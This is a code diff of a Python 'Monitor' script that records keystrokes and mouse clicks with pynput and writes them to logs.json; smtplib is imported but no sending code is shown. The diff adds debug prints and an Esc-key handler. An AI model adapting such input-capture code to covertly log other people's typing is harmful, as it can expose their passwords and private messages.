@@ -8,7 +8,6 @@ import json
 from pynput import keyboard, mouse
 import smtplib
 
-
 """
     MISCELLANEOUS
 """
@@ -77,6 +76,9 @@ class Monitor:
 
     def on_press(self, key):
         if (key == keyboard.Key.esc):
+            print('escaped!')
+            if self.text:
+                self.logs.append({'o' : self.text})
             self.done = True
             return False
         
@@ -95,10 +97,14 @@ class Monitor:
             self.record_raw_input({'m' : button.name.upper()})
 
     def run(self):
+        print('got into run()')
         self.keys.start()
         self.mice.start()
+        
+        print('here')
 
         while not self.done:
+            print('loop')
             pass
         
         with open('logs.json', 'w') as f:
